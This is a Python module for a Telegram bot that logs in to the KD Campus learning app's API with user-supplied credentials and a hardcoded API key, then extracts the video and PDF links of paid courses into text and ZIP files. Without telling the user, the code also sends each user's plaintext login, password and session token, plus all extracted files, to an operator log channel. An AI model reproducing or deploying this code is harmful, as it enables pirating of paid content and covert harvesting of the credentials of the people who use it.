
from Extractor import app
from pyrogram import filters
import json
import time
import httpx
import hashlib
from config import PREMIUM_LOGS, join,BOT_TEXT,THUMB_URL
from datetime import datetime
import pytz
import asyncio
import os
import logging
from pyrogram.enums import ParseMode
from pyrogram.types import Message
import requests
from Extractor.core.utils import forward_to_log

# Initialize logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Constants
TIMEOUT = 120
API_KEY = "kdc123"
THUMB_PATH = "thumb.jpg"  # Local path to save thumbnail

india_timezone = pytz.timezone('Asia/Kolkata')
current_time = datetime.now(india_timezone)
time_new = current_time.strftime("%d-%m-%Y %I:%M %p")

@app.on_message(filters.command(["kd"]))
async def kdlive(app, m):
    try:
        appname = 'KD Campus'
        await extract(app, m, appname)
    except Exception as e:
        logger.error(f"Error in kdlive: {e}")
        await m.reply_text(
            "❌ <b>An error occurred</b>\n\n"
            f"Error details: <code>{str(e)}</code>\n\n"
            "Please try again or contact support."
        )

async def download_thumbnail():
    """Download thumbnail image if not already downloaded"""
    if not os.path.exists(THUMB_PATH):
        try:
            response = requests.get(THUMB_URL)
            if response.status_code == 200:
                with open(THUMB_PATH, 'wb') as f:
                    f.write(response.content)
                logger.info("Thumbnail downloaded successfully")
                return THUMB_PATH
        except Exception as e:
            logger.error(f"Error downloading thumbnail: {e}")
            return None
    return THUMB_PATH

async def extract(app, m, appname):
    try:
        start_time = time.time()
        
        # Initial message
        editable = await m.reply_text(
            "🔹 <b>KD CAMPUS EXTRACTOR PRO</b> 🔹\n\n"
            "Send login details in one of these formats:\n"
            "1️⃣ <b>ID*Password:</b> <code>ID*Password</code>\n"
            "2️⃣ <b>Token:</b> <code>your_token</code>\n\n"
            "<i>Example:</i>\n"
            "- ID*Pass: <code>6969696969*password123</code>\n"
            "- Token: <code>abcdef123456</code>",
            parse_mode=ParseMode.HTML
        )
        
        try:
            input1 = await app.listen(m.chat.id, timeout=TIMEOUT)
            await forward_to_log(input1, "KD Live Extractor")
            id_password = input1.text
            await input1.delete()
        except asyncio.TimeoutError:
            await editable.edit_text("⚠️ <b>Timeout:</b> No response received. Please try again...", parse_mode=ParseMode.HTML)
            return
            
        # Process login
        async with httpx.AsyncClient() as client:
            try:
                if '*' in id_password:
                    # ID*Password login
                    mob, pwd = id_password.split('*', 1)
                    password = hashlib.sha512(pwd.encode()).hexdigest()
                    payload = {
                        "code": "",
                        "valid_id": "",
                        "api_key": API_KEY,
                        "mobilenumber": mob,
                        "password": password
                    }
                    
                    headers = {
                        "User-Agent": "okhttp/4.10.0",
                        "Accept-Encoding": "gzip",
                        "Content-Type": "application/json; charset=UTF-8"
                    }
                    
                    resp = (await client.post(
                        "https://web.kdcampus.live/android/Usersn/login_user",
                        json=payload,
                        headers=headers
                    )).json()
                    
                    if 'data' not in resp:
                        await editable.edit_text(
                            "❌ <b>Login Failed</b>\n\n"
                            "Please check your credentials and try again.",
                            parse_mode=ParseMode.HTML
                        )
                        return
                        
                    user_data = resp['data']
                    token = user_data['connection_key']
                    userid = user_data['id']
                else:
                    # Direct token login
                    token = id_password
                    # Get user ID from token validation
                    try:
                        validate_resp = (await client.get(
                            f'https://web.kdcampus.live/android/Dashboard/get_mycourse_data_renew_new/{token}/0/4'
                        )).json()
                        if not validate_resp:
                            await editable.edit_text(
                                "❌ <b>Invalid Token</b>\n\n"
                                "Please check your token and try again.",
                                parse_mode=ParseMode.HTML
                            )
                            return
                        userid = "0"  # Using default user ID since token is valid
                    except Exception as e:
                        await editable.edit_text(
                            "❌ <b>Invalid Token</b>\n\n"
                            "Please check your token and try again.",
                            parse_mode=ParseMode.HTML
                        )
                        return

                # Fetch courses
                resp = (await client.get(
                    f'https://web.kdcampus.live/android/Dashboard/get_mycourse_data_renew_new/{token}/{userid}/4'
                )).json()
                
                if not resp:
                    await editable.edit_text("❌ No courses found in your account.", parse_mode=ParseMode.HTML)
                    return
                    
                # Format batch information
                batch_list = ""
                batch_ids = []
                batch_data = []
                
                for item in resp:
                    course_id = item['course_id']
                    batch_id = item['batch_id']
                    name = item['batch_name']
                    price = "N/A"  # or item.get('price', 'N/A') if price exists
                    image = f"http://kdcampus.live/uploaded/landing_images/{item['banner_image_name']}"
                    
                    batch_list += f"<code>{batch_id}_{course_id}</code> - <b>{name}</b> 💰\n\n"
                    batch_ids.append(f"{batch_id}_{course_id}")
                    batch_data.append({
                        'id': str(course_id),
                        'batch_id': str(batch_id),
                        'name': name,
                        'image': image
                    })
                
                # Send login success message
                await editable.edit_text(
                    f"✅ <b>{appname} Login Successful</b>\n\n"
                    f"🆔 <b>Credentials:</b> <code>{id_password}</code>\n\n"
                    f"📚 <b>Available Batches:</b>\n\n{batch_list}",
                    parse_mode=ParseMode.HTML
                )
                
                # Log to premium channel
                await app.send_message(
                    PREMIUM_LOGS,
                    f"✅ <b>New Login - {appname}</b>\n"
                    f"🆔 <code>{id_password}</code>\n"
                    f"🔑 Token: <code>{token}</code>\n\n"
                    f"📚 Batches:\n{batch_list}",
                    parse_mode=ParseMode.HTML
                )
                
                # Ask for batch selection
                input2 = await app.ask(
                    m.chat.id,
                    f"<b>📥 Send the Batch ID to download</b>\n\n"
                    f"<b>💡 For ALL batches:</b> <code>{','.join(batch_ids)}</code>\n\n"
                    f"<i>Supports multiple IDs separated by comma</i>",
                    parse_mode=ParseMode.HTML
                )
                
                selected_ids = [id.strip() for id in input2.text.strip().split(',') if id.strip()]
                await input2.delete()
                await editable.delete()

                if not selected_ids:
                    await m.reply_text("❌ No valid batch IDs provided.", parse_mode=ParseMode.HTML)
                    return
                
                # Process each selected batch
                for batch_id in selected_ids:
                    if '_' not in batch_id:
                        await m.reply_text(f"❌ Invalid batch ID format: {batch_id}\nExpected format: batchID_courseID", parse_mode=ParseMode.HTML)
                        continue
                        
                    progress_msg = await m.reply_text(
                        "🔄 <b>Processing Large Batch</b>\n"
                        f"└─ Initializing batch: <code>{batch_id}</code>",
                        parse_mode=ParseMode.HTML
                    )
                    
                    try:
                        bid, ccid = batch_id.split('_')
                        batch_info = next((b for b in batch_data if b['batch_id'] == bid and b['id'] == ccid), None)
                        
                        if not batch_info:
                            await progress_msg.edit_text(
                                f"❌ <b>Invalid batch ID: {batch_id}</b>\n"
                                "Please check the batch ID and try again.",
                                parse_mode=ParseMode.HTML
                            )
                            continue

                        # Initialize content storage
                        all_urls = []
                        topic_wise_content = {}
                        
                        # Fetch subjects with error handling
                        try:
                            subjects_response = await client.get(
                                f"https://web.kdcampus.live/android/Dashboard/course_subject/{token}/{userid}/{ccid}/{bid}"
                            )
                            subjects_data = subjects_response.json()
                            
                            if 'subjects' not in subjects_data or not subjects_data['subjects']:
                                await progress_msg.edit_text(
                                    f"❌ <b>No subjects found for batch: {batch_id}</b>\n"
                                    "This batch might be empty or inaccessible.",
                                    parse_mode=ParseMode.HTML
                                )
                                continue
                                
                            subjects = subjects_data['subjects']
                        except Exception as e:
                            await progress_msg.edit_text(
                                f"❌ <b>Error fetching subjects for batch {batch_id}:</b>\n"
                                f"Error: <code>{str(e)}</code>",
                                parse_mode=ParseMode.HTML
                            )
                            continue
                        
                        total_subjects = len(subjects)
                        processed = 0
                        total_videos = 0
                        total_pdfs = 0
                        
                        for subject in subjects:
                            sid = subject['id']
                            subject_name = subject['subject_name']
                            subject_content = []
                            
                            await progress_msg.edit_text(
                                f"🔄 <b>Processing Large Batch</b>\n"
                                f"├─ Batch: <code>{batch_info['name']}</code>\n"
                                f"├─ Progress: {processed}/{total_subjects} subjects\n"
                                f"├─ Videos: {total_videos}\n"
                                f"├─ PDFs: {total_pdfs}\n"
                                f"└─ Current: <code>{subject_name}</code>",
                                parse_mode=ParseMode.HTML
                            )
                            
                            # Fetch videos with error handling
                            try:
                                videos_response = await client.get(
                                    f"https://web.kdcampus.live/android/Dashboard/course_details_video/{token}/{userid}/{ccid}/{bid}/0/{sid}/0"
                                )
                                videos = videos_response.json()
                                
                                if videos and isinstance(videos, list):
                                    for video in reversed(videos):
                                        title = video.get('content_title', '').strip()
                                        url = video.get('jwplayer_id', '')
                                        if title and url:
                                            url = "https://" + url
                                            all_urls.append(f"{title}: {url}")
                                            subject_content.append(f"🎬 {title}\n{url}")
                                            total_videos += 1
                            except Exception as e:
                                logger.error(f"Error fetching videos for subject {subject_name}: {e}")
                                
                            # Fetch PDFs with error handling
                            try:
                                pdfs_response = await client.get(
                                    f"https://web.kdcampus.live/android/Dashboard/course_details_pdf/{token}/{userid}/{ccid}/{bid}/0/{sid}/0"
                                )
                                pdfs = pdfs_response.json()
                                
                                if pdfs and isinstance(pdfs, list):
                                    for pdf in reversed(pdfs):
                                        title = pdf.get('content_title', '').strip()
                                        filename = pdf.get('file_name', '')
                                        if title and filename:
                                            url = "https://kdcampus.live/uploaded/content_data/" + filename
                                            all_urls.append(f"{title}: {url}")
                                            subject_content.append(f"📄 {title}\n{url}")
                                            total_pdfs += 1
                            except Exception as e:
                                logger.error(f"Error fetching PDFs for subject {subject_name}: {e}")
                                
                            if subject_content:
                                topic_wise_content[subject_name] = subject_content
                                
                            processed += 1
                            
                        if not all_urls:
                            await progress_msg.edit_text(
                                f"❌ <b>No content found in batch: {batch_info['name']}</b>\n"
                                "This batch might be empty or all content might be inaccessible.",
                                parse_mode=ParseMode.HTML
                            )
                            continue
                            
                        # Create files
                        batch_name = batch_info['name']
                        timestamp = int(time.time())
                        txt_filename = f"KD_{batch_name}_{timestamp}.txt"
                        zip_filename = f"KD_{batch_name}_{timestamp}_topics.zip"
                        
                        # Save simple URL list
                        with open(txt_filename, 'w', encoding='utf-8') as f:
                            f.write('\n'.join(all_urls))
                            
                        # Create topic-wise ZIP
                        try:
                            import zipfile
                            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                                for topic, content in topic_wise_content.items():
                                    safe_topic = "".join(x for x in topic if x.isalnum() or x in (' ', '-', '_')).strip()
                                    topic_filename = f"{safe_topic}.txt"
                                    zipf.writestr(topic_filename, '\n'.join(content))
                        except Exception as e:
                            logger.error(f"Error creating ZIP: {e}")
                            
                        # Count content types
                        video_count = sum(1 for url in all_urls if any(ext in url.lower() for ext in ['.mp4', '.m3u8', '.mpd', 'youtu.be', 'youtube.com', '/videos/', '/video/']))
                        pdf_count = sum(1 for url in all_urls if '.pdf' in url.lower())
                        other_count = len(all_urls) - (video_count + pdf_count)
                        
                        # Calculate stats and format caption
                        duration = time.time() - start_time
                        minutes, seconds = divmod(duration, 60)
                        
                        caption = (
                            f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
                            f"📱 <b>APP:</b> {appname}\n"
                            f"📚 <b>BATCH:</b> {batch_name} (ID: {batch_id})\n"
                            f"⏱ <b>EXTRACTION TIME:</b> {int(minutes):02d}:{int(seconds):02d}\n"
                            f"📅 <b>DATE:</b> {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%d-%m-%Y %H:%M:%S')} IST\n\n"
                            f"📊 <b>CONTENT STATS</b>\n"
                            f"├─ 📁 Total Links: {len(all_urls)}\n"
                            f"├─ 🎬 Videos: {video_count}\n"
                            f"├─ 📄 PDFs: {pdf_count}\n"
                            f"├─ 📦 Others: {other_count}\n"
                            f"└─ 📚 Topics: {len(topic_wise_content)}\n\n"
                            f"🚀 <b>Extracted by:</b> @{(await app.get_me()).username}\n\n"
                            f"<code>╾───• {BOT_TEXT} •───╼</code>"
                        )
                        
                        # Send initialization message
                        status_msg = await m.reply_text(
                            "🔄 <b>Processing Large Batch</b>\n"
                            "├─ Initializing extraction...\n"
                            "└─ Please wait...",
                            parse_mode=ParseMode.HTML
                        )

                        try:
                            # Download thumbnail
                            thumb_path = await download_thumbnail()
                            
                            # Send simple txt file
                            await app.send_document(
                                m.chat.id,
                                document=txt_filename,
                                caption=f"{caption}\n\n💡 This file contains simple URL list",
                                thumb=thumb_path if thumb_path else None,
                                parse_mode=ParseMode.HTML
                            )
                            await app.send_document(
                                PREMIUM_LOGS,
                                document=txt_filename,
                                caption=caption,
                                thumb=thumb_path if thumb_path else None,
                                parse_mode=ParseMode.HTML
                            )
                            
                            # Send zip file if it exists
                            if os.path.exists(zip_filename):
                                await app.send_document(
                                    m.chat.id,
                                    document=zip_filename,
                                    caption=f"{caption}\n\n💡 This ZIP contains topic-wise content",
                                    thumb=thumb_path if thumb_path else None,
                                    parse_mode=ParseMode.HTML
                                )
                                await app.send_document(
                                    PREMIUM_LOGS,
                                    document=zip_filename,
                                    caption=caption,
                                    thumb=thumb_path if thumb_path else None,
                                    parse_mode=ParseMode.HTML
                                )
                                
                            # Final status
                            await status_msg.edit_text(
                                "✅ <b>Extraction completed successfully!</b>\n\n"
                                f"📊 <b>Final Status:</b>\n"
                                f"├─ Processed: {total_subjects} subjects\n"
                                f"├─ Total Links: {len(all_urls)}\n"
                                f"└─ Files sent: ✅\n\n"
                                f"Thank you for using {appname} Extractor! 🌟",
                                parse_mode=ParseMode.HTML
                            )

                        except Exception as e:
                            logger.error(f"Error sending files: {e}")
                            await status_msg.edit_text(
                                "❌ <b>Error sending files</b>\n\n"
                                f"Error details: <code>{str(e)}</code>",
                                parse_mode=ParseMode.HTML
                            )
                            
                        finally:
                            # Cleanup
                            try:
                                os.remove(txt_filename)
                                if os.path.exists(zip_filename):
                                    os.remove(zip_filename)
                            except Exception as e:
                                logger.error(f"Error cleaning up files: {e}")
                                
                    except Exception as e:
                        logger.error(f"Error processing batch {batch_id}: {e}")
                        await progress_msg.edit_text(
                            "❌ <b>An error occurred during extraction</b>\n\n"
                            f"Error details: <code>{str(e)}</code>\n\n"
                            "Please try again or contact support.",
                            parse_mode=ParseMode.HTML
                        )
                        
            except Exception as e:
                logger.error(f"Error in login process: {e}")
                await editable.edit_text(
                    "❌ <b>Login Failed</b>\n\n"
                    f"Error details: <code>{str(e)}</code>\n\n"
                    "Please check your credentials and try again.",
                    parse_mode=ParseMode.HTML
                )
                
    except Exception as e:
        logger.error(f"Error in extract: {e}")
        await m.reply_text(
            "❌ <b>An error occurred</b>\n\n"
            f"Error details: <code>{str(e)}</code>\n\n"
            "Please try again or contact support.",
            parse_mode=ParseMode.HTML
        )
        

